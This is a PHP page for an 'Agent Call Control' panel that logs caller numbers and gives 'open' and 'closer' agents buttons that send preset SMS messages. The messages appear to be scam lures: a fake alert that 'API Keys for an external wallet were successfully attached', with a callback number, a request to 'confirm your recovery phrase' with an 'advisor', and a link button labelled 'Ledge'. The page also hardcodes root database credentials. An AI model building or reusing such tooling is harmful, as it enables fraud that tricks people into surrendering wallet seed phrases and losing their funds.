<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
date_default_timezone_set('Europe/London');
//exit("Hello World");
$agent  = $_GET['agent']  ?? 'Unknown';
$caller = $_GET['caller'] ?? 'Unknown';

$conn = mysqli_connect('localhost', 'root', '$Provis@2025', 'fromzero_morevitility');
if ($conn && $agent !== 'Unknown') {
    $eAgent = mysqli_real_escape_string($conn, $agent);
    $sql = "SELECT role FROM ausers WHERE user = '$eAgent' LIMIT 1";
    $result = mysqli_query($conn, $sql);
    if ($row = mysqli_fetch_assoc($result)) {
        $role = strtolower($row['role']);
    }
    //mysqli_close($conn);
}

$insernewdata = insertdata($conn,$agent,$caller) ;
mysqli_close($conn);

function insertdata($conn,$agent,$caller)
{
    $eAgent  = mysqli_real_escape_string($conn, $agent);
    $eCaller = mysqli_real_escape_string($conn, $caller);
    $eAction = 'verify';
    
    $aCaller = '61' . substr(substr($eCaller, 3), 0, -1); // 0 + drop first 3 + drop last
    $adminCaller = mysqli_real_escape_string($conn, $aCaller);
    $todattime = date('Y-m-d H:i:s');
    $sqlAdmin = "
      INSERT INTO adminsmsdata (agent, number, butclick, insertdate)
      VALUES ('$eAgent', '$adminCaller', '$eAction','$todattime')
    ";
    $okAdmin = mysqli_query($conn, $sqlAdmin);
   
    if(!$okAdmin) {
    
         file_put_contents(date('Y-m-d')."_newdata_adminsqlerror",date('H:i:s')." _".mysqli_error($conn).PHP_EOL,FILE_APPEND);
    
    }
    $sqlOwner = "
      INSERT INTO ownersmsdata (agent, number, butclick, insertdate)
      VALUES ('$eAgent', '$adminCaller', '$eAction','$todattime')
    ";
    $okOwner = mysqli_query($conn, $sqlOwner);
    
    if(!$okOwner) {
        
       file_put_contents(date('Y-m-d')."newdata_adminsqlerror",date('H:i:s')." _".mysqli_error($conn).PHP_EOL,FILE_APPEND);
    }
    
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Agent Call Control</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
</head>
<body class="bg-light">

<div class="container py-5">
    <div class="row justify-content-center">
        <div class="col-md-8">

            <div class="card shadow rounded">
                <div class="card-header bg-primary text-white">
                    <h5 class="mb-0">
                        Agent: <strong><?= htmlspecialchars($agent) ?></strong> |
                        Caller: <strong><?= htmlspecialchars($caller) ?></strong>
                    </h5>
                </div>

                <div class="card-body">

                    <!-- ===== Buttons & messages ===== -->
                    <div class="mb-4">
                        <button class="btn btn-outline-primary w-100 mb-2 save-btn"
                                data-action="Block">
                            <strong>Button 0 = Block</strong>
                        </button>
                        <div class="text-muted small">
                            Block this number for future incoming calls.
                        </div>
                    </div>
                    
                    <!-- ===== Button 1 (only for 'open') ===== -->
                    <?php if ($role === 'open'): ?>
                    
                    <div class="mb-4">
                        <button class="btn btn-outline-success w-100 mb-2 save-btn"
                                data-action="Key">
                            <strong>Button 1 = Key</strong>
                        </button>
                        <div class="text-muted small">
                            API Keys for an external wallet were successfully attached to your account.
                            If this was not initiated by you, call us immediately on
                            <strong>+61 1800576977</strong> / <strong>+61 26105933</strong>. REF/<strong>19237</strong>
                        </div>
                    </div>
                    
                     <?php endif; ?>
                    
                    
                     <!-- ===== Buttons 2, 3, 4 (only for 'closer') ===== -->
                    <?php if ($role === 'closer'): ?>
                    
                    <div class="mb-4">
                        <button class="btn btn-outline-warning w-100 mb-2 save-btn"
                                data-action="Key Cancel">
                            <strong>Button 2 = Key Cancel</strong>
                        </button>
                        <div class="text-muted small">
                            External wallet API connection cancelled. The API keys have been removed
                            from your account and access revoked. REF/<strong>19237</strong>
                        </div>
                    </div>

                    <div class="mb-4">
                        <button class="btn btn-outline-info w-100 mb-2 save-btn"
                                data-action="Phrase">
                            <strong>Button 3 = Phrase 12</strong>
                        </button>
                        <div class="text-muted small">
                            Please confirm your recovery phrase with your assigned advisor when prompted.
                        </div>
                    </div>

                    <div>
                        <button class="btn btn-outline-danger w-100 mb-2 save-btn"
                                data-action="Ledge">
                            <strong>Button 4 = Ledge</strong>
                        </button>
                        <div class="text-muted small">
                            <a href="https://link.com" target="_blank">https://link.com</a>
                        </div>
                    </div>
                    
                     <?php endif; ?>
                    <!-- ============================= -->

                </div>
            </div>

        </div>
    </div>
</div>

<script>
$(function () {
    $('.save-btn').on('click', function () {
        const action = $(this).data('action');
        $.post('savedata.php', {
            agent:  '<?= addslashes($agent) ?>',
            caller: '<?= addslashes($caller) ?>',
            action: action
        })
        .done(resp => {
            try {
                const j = JSON.parse(resp);
                alert(j.message || 'Saved!');
            } catch {
                alert('Saved!');
            }
        })
        .fail(() => alert('Error saving data.'));
    });
});
</script>
</body>
</html>
